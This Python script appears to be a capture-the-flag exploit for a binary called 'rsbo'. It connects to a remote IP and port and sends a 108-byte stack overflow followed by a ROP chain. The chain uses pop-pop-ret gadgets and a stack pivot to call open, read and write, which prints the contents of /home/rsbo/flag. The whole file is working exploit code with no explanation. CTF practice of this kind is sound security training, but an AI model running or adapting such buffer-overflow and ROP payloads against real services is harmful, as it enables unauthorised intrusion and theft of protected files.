#!/usr/bin/env python
# -*- coding: utf-8 -*-
from zio import *

ip = '210.61.8.96'
ip = '10.211.55.48'
port = 51342

io = zio((ip, port), timeout = 1000, print_write = COLORED(REPR))

open_plt = 0x8048420
flag = 0x80487D0
read_plt = 0x80483E0
buf = 0x0804A0A1
write_plt = 0x8048450
read_80_bytes = 0x804865C
gadget1 = 0x804879E
gadget2 = 0x804879D
pivot = 0x804867D

payload = ""
payload += '\x00'*108
payload += l32(read_80_bytes)
payload += l32(gadget1) # pop pop ret
payload += l32(buf) # read again
payload += l32(buf) # ebp <- buf
payload += l32(pivot) # mov esp, ebp

# fd = open("/home/rsbo/flag", 0);
payload += l32(0xdeadbeef)
#payload += l32(open_plt) + l32(flag) + l32(0)
payload += l32(open_plt) + l32(gadget1) + l32(flag) + l32(0)

# read(fd, buf, 16u)
# payload += l32(read_plt) + l32(3) + l32(buf) + l32(0x16)
payload += l32(read_plt) + l32(gadget2) + l32(3) + l32(buf+100) + l32(50)

# write(1, &buf, len);
# payload += l32(write_plt) + l32(1) + l32(buf) + l32(0x16)
payload += l32(write_plt) + l32(gadget2) + l32(1) + l32(buf+100) + l32(50)

#io.write('\x00'*108+"AAAA"+"BBBB"+"CCCC")
io.write(payload)

io.readlines()

